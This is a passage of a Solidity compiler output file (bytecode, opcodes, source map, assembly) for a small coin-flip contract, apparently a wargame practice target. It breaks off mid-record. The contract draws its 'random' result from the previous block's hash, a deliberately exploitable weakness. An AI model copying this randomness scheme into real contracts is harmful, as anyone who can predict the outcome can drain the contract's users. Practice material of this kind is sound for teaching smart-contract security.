							"object": "608060405234801561001057600080fd5b50600436106100365760003560e01c80631d263f671461003b578063e6f334d71461006b575b600080fd5b6100556004803603810190610050919061013b565b610089565b6040516100629190610182565b60405180910390f35b610073610120565b604051610080919061019d565b60405180910390f35b60008060014361009991906101e9565b4060001c90508060015414156100ae57600080fd5b806001819055506000600254826100c591906101b8565b90506000600182146100d85760006100db565b60015b9050841515811515141561010c576000808154809291906100fb90610233565b91905055506001935050505061011b565b60008081905550600093505050505b919050565b60005481565b600081359050610135816102da565b92915050565b60006020828403121561014d57600080fd5b600061015b84828501610126565b91505092915050565b61016d8161021d565b82525050565b61017c81610229565b82525050565b60006020820190506101976000830184610164565b92915050565b60006020820190506101b26000830184610173565b92915050565b60006101c382610229565b91506101ce83610229565b9250826101de576101dd6102ab565b5b828204905092915050565b60006101f482610229565b91506101ff83610229565b9250828210156102125761021161027c565b5b828203905092915050565b60008115159050919050565b6000819050919050565b600061023e82610229565b91507fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff8214156102715761027061027c565b5b600182019050919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601260045260246000fd5b6102e38161021d565b81146102ee57600080fd5b5056fea2646970667358221220923d838005b64d30aa2dad78940807fe3499a1db917e5328ef15042e95d6d3ad64736f6c63430008000033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x36 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x1D263F67 EQ PUSH2 0x3B JUMPI DUP1 PUSH4 0xE6F334D7 EQ PUSH2 0x6B JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x55 PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x50 SWAP2 SWAP1 PUSH2 0x13B JUMP JUMPDEST PUSH2 0x89 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x62 SWAP2 SWAP1 PUSH2 0x182 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x73 PUSH2 0x120 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x80 SWAP2 SWAP1 PUSH2 0x19D JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x1 NUMBER PUSH2 0x99 SWAP2 SWAP1 PUSH2 0x1E9 JUMP JUMPDEST BLOCKHASH PUSH1 0x0 SHR SWAP1 POP DUP1 PUSH1 0x1 SLOAD EQ ISZERO PUSH2 0xAE JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP1 PUSH1 0x1 DUP2 SWAP1 SSTORE POP PUSH1 0x0 PUSH1 0x2 SLOAD DUP3 PUSH2 0xC5 SWAP2 SWAP1 PUSH2 0x1B8 JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH1 0x1 DUP3 EQ PUSH2 0xD8 JUMPI PUSH1 0x0 PUSH2 0xDB JUMP JUMPDEST PUSH1 0x1 JUMPDEST SWAP1 POP DUP5 ISZERO ISZERO DUP2 ISZERO ISZERO EQ ISZERO PUSH2 0x10C JUMPI PUSH1 0x0 DUP1 DUP2 SLOAD DUP1 SWAP3 SWAP2 SWAP1 PUSH2 0xFB SWAP1 PUSH2 0x233 JUMP JUMPDEST SWAP2 SWAP1 POP SSTORE POP PUSH1 0x1 SWAP4 POP POP POP POP PUSH2 0x11B JUMP JUMPDEST PUSH1 0x0 DUP1 DUP2 SWAP1 SSTORE POP PUSH1 0x0 SWAP4 POP POP POP POP JUMPDEST SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 SLOAD DUP2 JUMP JUMPDEST PUSH1 0x0 DUP2 CALLDATALOAD SWAP1 POP PUSH2 0x135 DUP2 PUSH2 0x2DA JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x14D JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 PUSH2 0x15B DUP5 DUP3 DUP6 ADD PUSH2 0x126 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x16D DUP2 PUSH2 0x21D JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH2 0x17C DUP2 PUSH2 0x229 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x197 PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x164 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x1B2 PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x173 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x1C3 DUP3 PUSH2 0x229 JUMP JUMPDEST SWAP2 POP PUSH2 0x1CE DUP4 PUSH2 0x229 JUMP JUMPDEST SWAP3 POP DUP3 PUSH2 0x1DE JUMPI PUSH2 0x1DD PUSH2 0x2AB JUMP JUMPDEST JUMPDEST DUP3 DUP3 DIV SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x1F4 DUP3 PUSH2 0x229 JUMP JUMPDEST SWAP2 POP PUSH2 0x1FF DUP4 PUSH2 0x229 JUMP JUMPDEST SWAP3 POP DUP3 DUP3 LT ISZERO PUSH2 0x212 JUMPI PUSH2 0x211 PUSH2 0x27C JUMP JUMPDEST JUMPDEST DUP3 DUP3 SUB SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 ISZERO ISZERO SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x23E DUP3 PUSH2 0x229 JUMP JUMPDEST SWAP2 POP PUSH32 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 EQ ISZERO PUSH2 0x271 JUMPI PUSH2 0x270 PUSH2 0x27C JUMP JUMPDEST JUMPDEST PUSH1 0x1 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x11 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x12 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH2 0x2E3 DUP2 PUSH2 0x21D JUMP JUMPDEST DUP2 EQ PUSH2 0x2EE JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 SWAP3 RETURNDATASIZE DUP4 DUP1 SDIV 0xB6 0x4D ADDRESS 0xAA 0x2D 0xAD PUSH25 0x940807FE3499A1DB917E5328EF15042E95D6D3AD64736F6C63 NUMBER STOP ADDMOD STOP STOP CALLER ",
							"sourceMap": "57:655:0:-:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;281:429;;;;;;;;;;;;;:::i;:::-;;:::i;:::-;;;;;;;:::i;:::-;;;;;;;;80:30;;;:::i;:::-;;;;;;;:::i;:::-;;;;;;;;281:429;324:4;336:18;390:1;375:12;:16;;;;:::i;:::-;365:27;357:36;;336:57;;416:10;404:8;;:22;400:51;;;436:8;;;400:51;468:10;457:8;:21;;;;484:16;516:6;;503:10;:19;;;;:::i;:::-;484:38;;528:9;552:1;540:8;:13;:28;;563:5;540:28;;;556:4;540:28;528:40;;587:6;579:14;;:4;:14;;;575:131;;;603:15;;:17;;;;;;;;;:::i;:::-;;;;;;635:4;628:11;;;;;;;575:131;678:1;660:15;:19;;;;694:5;687:12;;;;;281:429;;;;:::o;80:30::-;;;;:::o;7:133:2:-;;88:6;75:20;66:29;;104:30;128:5;104:30;:::i;:::-;56:84;;;;:::o;146:256::-;;251:2;239:9;230:7;226:23;222:32;219:2;;;267:1;264;257:12;219:2;310:1;335:50;377:7;368:6;357:9;353:22;335:50;:::i;:::-;325:60;;281:114;209:193;;;;:::o;408:109::-;489:21;504:5;489:21;:::i;:::-;484:3;477:34;467:50;;:::o;523:118::-;610:24;628:5;610:24;:::i;:::-;605:3;598:37;588:53;;:::o;647:210::-;;772:2;761:9;757:18;749:26;;785:65;847:1;836:9;832:17;823:6;785:65;:::i;:::-;739:118;;;;:::o;863:222::-;;994:2;983:9;979:18;971:26;;1007:71;1075:1;1064:9;1060:17;1051:6;1007:71;:::i;:::-;961:124;;;;:::o;1091:185::-;;1148:20;1166:1;1148:20;:::i;:::-;1143:25;;1182:20;1200:1;1182:20;:::i;:::-;1177:25;;1221:1;1211:2;;1226:18;;:::i;:::-;1211:2;1268:1;1265;1261:9;1256:14;;1133:143;;;;:::o;1282:191::-;;1342:20;1360:1;1342:20;:::i;:::-;1337:25;;1376:20;1394:1;1376:20;:::i;:::-;1371:25;;1415:1;1412;1409:8;1406:2;;;1420:18;;:::i;:::-;1406:2;1465:1;1462;1458:9;1450:17;;1327:146;;;;:::o;1479:90::-;;1556:5;1549:13;1542:21;1531:32;;1521:48;;;:::o;1575:77::-;;1641:5;1630:16;;1620:32;;;:::o;1658:233::-;;1720:24;1738:5;1720:24;:::i;:::-;1711:33;;1766:66;1759:5;1756:77;1753:2;;;1836:18;;:::i;:::-;1753:2;1883:1;1876:5;1872:13;1865:20;;1701:190;;;:::o;1897:180::-;1945:77;1942:1;1935:88;2042:4;2039:1;2032:15;2066:4;2063:1;2056:15;2083:180;2131:77;2128:1;2121:88;2228:4;2225:1;2218:15;2252:4;2249:1;2242:15;2269:116;2339:21;2354:5;2339:21;:::i;:::-;2332:5;2329:32;2319:2;;2375:1;2372;2365:12;2319:2;2309:76;:::o"
						},
						"gasEstimates": {
							"creation": {
								"codeDepositCost": "161400",
								"executionCost": "25228",
								"totalCost": "186628"
							},
							"external": {
								"consecutiveWins()": "1129",
								"flip(bool)": "infinite"
							}
						},
						"legacyAssembly": {
							".code": [
								{
									"begin": 57,
									"end": 712,
									"name": "PUSH",
									"source": 0,
									"value": "80"
								},
								{
									"begin": 57,
									"end": 712,
									"name": "PUSH",
									"source": 0,
									"value": "40"
								},
								{
									"begin": 57,
									"end": 712,
									"name": "MSTORE",
									"source": 0
								},
								{
									"begin": 151,
									"end": 228,
									"name": "PUSH",
									"source": 0,
									"value": "8000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 134,
									"end": 228,
									"name": "PUSH",
									"source": 0,
									"value": "2"
								},
								{
									"begin": 134,
									"end": 228,
									"name": "SSTORE",
									"source": 0
								},
								{
									"begin": 233,
									"end": 277,
									"name": "CALLVALUE",
									"source": 0
								},
								{
									"begin": 233,
									"end": 277,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 233,
									"end": 277,
									"name": "ISZERO",
									"source": 0
								},
								{
									"begin": 233,
									"end": 277,
									"name": "PUSH [tag]",
									"source": 0,
									"value": "1"
								},
								{
									"begin": 233,
									"end": 277,
									"name": "JUMPI",
									"source": 0
								},
								{
									"begin": 233,
									"end": 277,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 233,
									"end": 277,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 233,
									"end": 277,
									"name": "REVERT",
									"source": 0
								},
								{
									"begin": 233,
									"end": 277,
									"name": "tag",
									"source": 0,
									"value": "1"
								},
								{
									"begin": 233,
									"end": 277,
									"name": "JUMPDEST",
									"source": 0
								},
								{
									"begin": 233,
									"end": 277,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 271,
									"end": 272,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 253,
									"end": 268,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 253,
									"end": 272,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 253,
									"end": 272,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 253,
									"end": 272,
									"name": "SSTORE",
									"source": 0
								},
								{
									"begin": 253,
									"end": 272,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 57,
									"end": 712,
									"name": "PUSH #[$]",
									"source": 0,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 57,
									"end": 712,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 57,
									"end": 712,
									"name": "PUSH [$]",
									"source": 0,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 57,
									"end": 712,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 57,
									"end": 712,
									"name": "CODECOPY",
									"source": 0
								},
								{
									"begin": 57,
									"end": 712,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 57,
									"end": 712,
									"name": "RETURN",
									"source": 0
								}
							],
							".data": {
								"0": {
									".auxdata": "a2646970667358221220923d838005b64d30aa2dad78940807fe3499a1db917e5328ef15042e95d6d3ad64736f6c63430008000033",
									".code": [
										{
											"begin": 57,
											"end": 712,
											"name": "PUSH",
											"source": 0,
											"value": "80"
										},
										{
											"begin": 57,
											"end": 712,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 57,
											"end": 712,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 57,
											"end": 712,
											"name": "CALLVALUE",
											"source": 0
										},
										{
											"begin": 57,
											"end": 712,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 57,
											"end": 712,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 57,
											"end": 712,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 57,
											"end": 712,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 57,
											"end": 712,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 57,
											"end": 712,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 57,
											"end": 712,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 57,
											"end": 712,
											"name": "tag",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 57,
											"end": 712,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 57,
											"end": 712,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 57,
											"end": 712,
											"name": "PUSH",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 57,
											"end": 712,
											"name": "CALLDATASIZE",
											"source": 0
										},
										{
											"begin": 57,
											"end": 712,
											"name": "LT",
											"source": 0
										},
										{
											"begin": 57,
											"end": 712,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 57,
											"end": 712,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 57,
											"end": 712,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 57,
											"end": 712,
											"name": "CALLDATALOAD",
											"source": 0
										},
										{
											"begin": 57,
											"end": 712,
											"name": "PUSH",
											"source": 0,
											"value": "E0"
										},
										{
											"begin": 57,
											"end": 712,
											"name": "SHR",
											"source": 0
										},
										{
											"begin": 57,
											"end": 712,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 57,
											"end": 712,
											"name": "PUSH",
											"source": 0,
											"value": "1D263F67"
										},
										{
											"begin": 57,
											"end": 712,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 57,
											"end": 712,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "3"
										},
										{
											"begin": 57,
											"end": 712,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 57,
											"end": 712,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 57,
											"end": 712,
											"name": "PUSH",
											"source": 0,
											"value": "E6F334D7"
										},
										{
											"begin": 57,
											"end": 712,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 57,
											"end": 712,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 57,
											"end": 712,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 57,
											"end": 712,
											"name": "tag",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 57,
											"end": 712,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 57,
											"end": 712,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 57,
											"end": 712,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 57,
											"end": 712,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 281,
											"end": 710,
											"name": "tag",
											"source": 0,
											"value": "3"
										},
										{
											"begin": 281,
											"end": 710,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 281,
											"end": 710,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "5"
										},
										{
											"begin": 281,
											"end": 710,
											"name": "PUSH",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 281,
											"end": 710,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 281,
											"end": 710,
											"name": "CALLDATASIZE",
											"source": 0
										},
										{
											"begin": 281,
											"end": 710,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 281,
											"end": 710,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 281,
											"end": 710,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 281,
											"end": 710,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 281,
											"end": 710,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "6"
										},
										{
											"begin": 281,
											"end": 710,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 281,
											"end": 710,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 281,
											"end": 710,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "7"
										},
										{
											"begin": 281,
											"end": 710,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 281,
											"end": 710,
											"name": "tag",
											"source": 0,
											"value": "6"
										},
										{
											"begin": 281,
											"end": 710,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 281,
											"end": 710,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "8"
										},
										{
											"begin": 281,
											"end": 710,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 281,
											"end": 710,
											"name": "tag",
											"source": 0,
											"value": "5"
										},
										{
											"begin": 281,
											"end": 710,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 281,
											"end": 710,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 281,
											"end": 710,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 281,
											"end": 710,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "9"
										},
										{
											"begin": 281,
											"end": 710,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 281,
											"end": 710,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 281,
											"end": 710,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "10"
										},
										{
											"begin": 281,
											"end": 710,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 281,
											"end": 710,
											"name": "tag",
											"source": 0,
											"value": "9"
										},
										{
											"begin": 281,
											"end": 710,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 281,
											"end": 710,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 281,
											"end": 710,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 281,
											"end": 710,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 281,
											"end": 710,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 281,
											"end": 710,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 281,
											"end": 710,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 281,
											"end": 710,
											"name": "RETURN",
											"source": 0
										},
										{
											"begin": 80,
											"end": 110,
											"name": "tag",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 80,
											"end": 110,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 80,
											"end": 110,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "11"
										},
										{
											"begin": 80,
											"end": 110,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "12"
										},
										{
											"begin": 80,
											"end": 110,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 80,
											"end": 110,
											"name": "tag",
											"source": 0,
											"value": "11"
										},
										{
											"begin": 80,
											"end": 110,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 80,
											"end": 110,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 80,
											"end": 110,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 80,
											"end": 110,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "13"
										},
										{
											"begin": 80,
											"end": 110,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 80,
											"end": 110,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 80,
											"end": 110,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "14"
										},
										{
											"begin": 80,
											"end": 110,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 80,
											"end": 110,
											"name": "tag",
											"source": 0,
											"value": "13"
										},
										{
											"begin": 80,
											"end": 110,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 80,
											"end": 110,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 80,
											"end": 110,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 80,
											"end": 110,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 80,
											"end": 110,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 80,
											"end": 110,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 80,
											"end": 110,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 80,
											"end": 110,
											"name": "RETURN",
											"source": 0
										},
										{
											"begin": 281,
											"end": 710,
											"name": "tag",
											"source": 0,
											"value": "8"
										},
										{
											"begin": 281,
											"end": 710,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 324,
											"end": 328,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 336,
											"end": 354,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 390,
											"end": 391,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 375,
											"end": 387,
											"name": "NUMBER",
											"source": 0
										},
										{
											"begin": 375,
											"end": 391,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "16"
										},
										{
											"begin": 375,
											"end": 391,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 375,
											"end": 391,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 375,
											"end": 391,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "17"
										},
										{
											"begin": 375,
											"end": 391,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 375,
											"end": 391,
											"name": "tag",
											"source": 0,
											"value": "16"
										},
										{
											"begin": 375,
											"end": 391,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 365,
											"end": 392,
											"name": "BLOCKHASH",
											"source": 0
										},
										{
											"begin": 357,
											"end": 393,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 357,
											"end": 393,
											"name": "SHR",
											"source": 0
										},
										{
											"begin": 336,
											"end": 393,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 336,
											"end": 393,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 416,
											"end": 426,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 404,
											"end": 412,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 404,
											"end": 412,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 404,
											"end": 426,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 400,
											"end": 451,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 400,
											"end": 451,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "18"
										},
										{
											"begin": 400,
											"end": 451,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 436,
											"end": 444,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 436,
											"end": 444,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 436,
											"end": 444,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 400,
											"end": 451,
											"name": "tag",
											"source": 0,
											"value": "18"
										},
										{
											"begin": 400,
											"end": 451,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 468,
											"end": 478,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 457,
											"end": 465,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 457,
											"end": 478,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 457,
											"end": 478,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 457,
											"end": 478,
											"name": "SSTORE",
											"source": 0
										},
										{
											"begin": 457,
											"end": 478,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 484,
											"end": 500,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 516,
											"end": 522,
											"name": "PUSH",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 516,
											"end": 522,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 503,
											"end": 513,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 503,
											"end": 522,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "19"
										},
										{
											"begin": 503,
											"end": 522,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 503,
											"end": 522,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 503,
											"end": 522,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 503,
											"end": 522,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 503,
											"end": 522,
											"name": "tag",
											"source": 0,
											"value": "19"
										},
										{
											"begin": 503,
											"end": 522,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 484,
											"end": 522,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 484,
											"end": 522,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 528,
											"end": 537,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 552,
											"end": 553,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 540,
											"end": 548,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 540,
											"end": 553,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 540,
											"end": 568,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "21"
										},
										{
											"begin": 540,
											"end": 568,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 563,
											"end": 568,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 540,
											"end": 568,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "22"
										},
										{
											"begin": 540,
											"end": 568,
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 540,
											"end": 568,
											"name": "tag",
											"source": 0,
											"value": "21"
										},
										{
											"begin": 540,
											"end": 568,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 556,
											"end": 560,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 540,
											"end": 568,
											"name": "tag",
											"source": 0,
											"value": "22"
										},
										{
											"begin": 540,
											"end": 568,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 528,
											"end": 568,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 528,
											"end": 568,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 587,
											"end": 593,
											"name": "DUP5",
											"source": 0
										},
										{
											"begin": 579,
											"end": 593,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 579,
											"end": 593,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 579,
											"end": 583,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 579,
											"end": 593,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 579,
											"end": 593,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 579,
											"end": 593,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 575,
											"end": 706,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 575,
											"end": 706,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "23"
										},
										{
											"begin": 575,
											"end": 706,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 603,
											"end": 618,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 603,
											"end": 618,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 603,
											"end": 620,
											"name": "DUP2",
											"source": 0
										},
										{
